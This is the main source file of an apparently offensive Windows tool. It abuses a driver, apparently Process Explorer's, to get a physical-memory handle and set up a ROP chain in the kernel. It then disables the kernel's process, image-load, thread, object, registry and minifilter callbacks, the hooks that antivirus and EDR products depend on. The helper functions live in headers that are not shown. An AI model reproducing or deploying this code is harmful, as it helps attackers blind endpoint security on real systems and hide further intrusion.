#include"DriverInit.h"
#include"DisableCallBack.h"

int main()
{
	ULONG64 phyMemHandle = NULL;
	ULONG64 allocatePool = NULL;
	SetPrivilegeA(SE_DEBUG_NAME, TRUE);
	do
	{
		if (!InitFunc())
			break;

		if (!DriverInit())
			break;

		if (OpenProcExp())
		{
			phyMemHandle = GetPhysicalMemoryHandle();
			SetPhyMem((HANDLE)phyMemHandle);
			allocatePool = AllocateRopPool();
			CloseProcExp();
		}  
		DriverUninit();

		if (!phyMemHandle)
			break;

		if (!RopInit(allocatePool))
			break;

		//RopDemo((HANDLE)2124);
		//InitFunc();

		DisablePsProcess();
		DisablePsImg();
		DisablePsThread();

		DisableObCallBack();

		DisableCm();
		
		DisableMinifilter();

	} while (false);

	system("pause");

	return 0;
}

